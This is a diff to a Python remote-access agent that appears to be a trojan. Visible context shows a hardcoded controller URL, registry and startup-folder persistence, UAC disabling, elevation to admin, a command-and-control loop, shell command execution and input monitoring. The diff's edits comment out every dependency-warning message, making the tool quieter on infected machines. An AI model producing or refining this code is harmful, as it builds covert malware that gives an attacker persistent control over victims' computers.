@@ -148,21 +148,21 @@ try:
     MSS_AVAILABLE = True
 except ImportError:
     MSS_AVAILABLE = False
-    print("Warning: mss not available, screen capture may not work")
+    # print("Warning: mss not available, screen capture may not work")
 
 try:
     import numpy as np
     NUMPY_AVAILABLE = True
 except ImportError:
     NUMPY_AVAILABLE = False
-    print("Warning: numpy not available, some features may not work")
+    # print("Warning: numpy not available, some features may not work")
 
 try:
     import cv2
     CV2_AVAILABLE = True
 except ImportError:
     CV2_AVAILABLE = False
-    print("Warning: opencv-python not available, video processing may not work")
+    # print("Warning: opencv-python not available, video processing may not work")
 
 # Windows-specific imports
 try:
@@ -185,7 +185,7 @@ try:
     PYAUDIO_AVAILABLE = True
 except ImportError:
     PYAUDIO_AVAILABLE = False
-    print("Warning: PyAudio not available, audio features may not work")
+    # print("Warning: PyAudio not available, audio features may not work")
 
 # Input handling imports
 try:
@@ -194,7 +194,7 @@ try:
     PYNPUT_AVAILABLE = True
 except ImportError:
     PYNPUT_AVAILABLE = False
-    print("Warning: pynput not available, input monitoring may not work")
+    # print("Warning: pynput not available, input monitoring may not work")
 
 # GUI and graphics imports
 try:
@@ -202,7 +202,7 @@ try:
     PYGAME_AVAILABLE = True
 except ImportError:
     PYGAME_AVAILABLE = False
-    print("Warning: pygame not available, some GUI features may not work")
+    # print("Warning: pygame not available, some GUI features may not work")
 
 # WebSocket imports
 try:
@@ -210,7 +210,7 @@ try:
     WEBSOCKETS_AVAILABLE = True
 except ImportError:
     WEBSOCKETS_AVAILABLE = False
-    print("Warning: websockets not available, WebSocket features may not work")
+    # print("Warning: websockets not available, WebSocket features may not work")
 
 # Speech recognition imports
 try:
@@ -218,7 +218,7 @@ try:
     SPEECH_RECOGNITION_AVAILABLE = True
 except ImportError:
     SPEECH_RECOGNITION_AVAILABLE = False
-    print("Warning: speech_recognition not available, voice features may not work")
+    # print("Warning: speech_recognition not available, voice features may not work")
 
 # System monitoring imports
 try:
@@ -226,7 +226,7 @@ try:
     PSUTIL_AVAILABLE = True
 except ImportError:
     PSUTIL_AVAILABLE = False
-    print("Warning: psutil not available, system monitoring may not work")
+    # print("Warning: psutil not available, system monitoring may not work")
 
 # Image processing imports
 try:
@@ -234,7 +234,7 @@ try:
     PIL_AVAILABLE = True
 except ImportError:
     PIL_AVAILABLE = False
-    print("Warning: Pillow not available, image processing may not work")
+    # print("Warning: Pillow not available, image processing may not work")
 
 # GUI automation imports
 try:
@@ -242,7 +242,7 @@ try:
     PYAUTOGUI_AVAILABLE = True
 except ImportError:
     PYAUTOGUI_AVAILABLE = False
-    print("Warning: pyautogui not available, GUI automation may not work")
+    # print("Warning: pyautogui not available, GUI automation may not work")
 
 # Socket.IO imports
 try:
@@ -250,7 +250,7 @@ try:
     SOCKETIO_AVAILABLE = True
 except ImportError:
     SOCKETIO_AVAILABLE = False
-    print("Warning: python-socketio not available, real-time communication may not work")
+    # print("Warning: python-socketio not available, real-time communication may not work")
 
 SERVER_URL = "https://agent-controller.onrender.com"  # Change to your controller's URL
 
@@ -1545,7 +1545,6 @@ def registry_run_key_persistence():
     except Exception as e:
         print(f"Registry persistence failed: {e}")
         return False
-
 def startup_folder_persistence():
     """Establish persistence via startup folder."""
     try:
@@ -3084,7 +3083,6 @@ def disable_uac():
     except Exception as e:
         print(f"[!] Error disabling UAC: {e}")
         return False
-
 def run_as_admin():
     """Relaunch the script with elevated privileges if not already admin."""
     if not WINDOWS_AVAILABLE:
@@ -3871,7 +3869,6 @@ def stop_voice_control():
             VOICE_CONTROL_THREAD.join(timeout=2)
         VOICE_CONTROL_THREAD = None
         print("Stopped voice control.")
-
 # --- Remote Control Functions ---
 
 # Global variables for remote control
@@ -4580,7 +4577,6 @@ def execute_command(command):
             return "Bash not found. Command execution failed."
     except Exception as e:
         return f"Command execution failed: {e}"
-
 def main_loop(agent_id):
     """The main command and control loop."""
     # Initialize high-performance systems
@@ -5357,7 +5353,6 @@ except ImportError:
 if PYAUTOGUI_AVAILABLE:
     pyautogui.FAILSAFE = False
     pyautogui.PAUSE = 0  # Remove delay between commands
-
 class LowLatencyInputHandler:
     """Ultra-low latency input handling system"""
     
@@ -6151,7 +6146,6 @@ OPTIMIZED_DASHBOARD_HTML = """<!DOCTYPE html>
     </script>
 </body>
 </html>"""
-
 # ========================================================================================
 # PROCESS TERMINATION TEST FUNCTIONS
 # From: test_process_termination.py
@@ -7541,7 +7535,6 @@ def check_registry_persistence():
     except Exception as e:
         print(f"[INFO] No registry persistence found: {e}")
         return False
-
 def agent_main():
     """Main function for agent mode (original main functionality)."""
     print("=" * 60)
